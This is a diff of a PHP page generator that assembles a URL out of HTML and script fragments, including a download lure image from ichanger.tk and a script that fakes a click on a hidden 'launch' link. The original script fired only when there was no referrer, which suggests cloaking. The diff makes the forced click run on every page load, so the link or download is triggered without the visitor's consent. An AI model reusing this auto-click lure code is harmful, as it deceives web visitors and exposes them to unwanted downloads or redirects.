@@ -42,12 +42,8 @@ $uri14 = '<h1>Press <img src="http://ichanger.tk/ui/simages/dl.png"> or <img src
 $uri15 = '<a id="launch" href="' . htmlspecialchars($ur) . '">';
 $uri16 = '<script> if(!document.referrer){activate()}function activate(){var e=document.getElementById("launch");var t=document.createEvent("MouseEvents");t.initEvent("click",true,true);e.dispatchEvent(t);window.opener=window;var n=window.open(location.href,"_self");n.close()} </script>';
 ?>
+<body onload="activate();">
 <Script>
-    if (!document.referrer) {
-        document.write("<div style='padding: 10px;'><p style=''></p></div>");
-        activate();
-    }
-    
     function activate() {
         var e = document.getElementById('launch');
         var ev = document.createEvent('MouseEvents');
@@ -57,7 +53,6 @@ $uri16 = '<script> if(!document.referrer){activate()}function activate(){var e=d
         var win = window.open(location.href, '_self');
         win.close();
     }  
-    
 </script>
 <a id="simClickElement" href="<?php echo htmlspecialchars($uri1); echo htmlspecialchars($uri2); echo htmlspecialchars($uri3); echo htmlspecialchars($uri4); echo htmlspecialchars($uri5); echo htmlspecialchars($uri5S); echo htmlspecialchars($uri6); echo htmlspecialchars($uri7); echo htmlspecialchars($uri8); echo htmlspecialchars($uri9); echo htmlspecialchars($uri10); echo htmlspecialchars($uri11); echo htmlspecialchars($uri12); echo htmlspecialchars($uri13); echo htmlspecialchars($uri14); echo htmlspecialchars($uri15); echo htmlspecialchars($uri16); echo htmlspecialchars($uri17); ?>">GENERATED URL</a>
-
+</body>
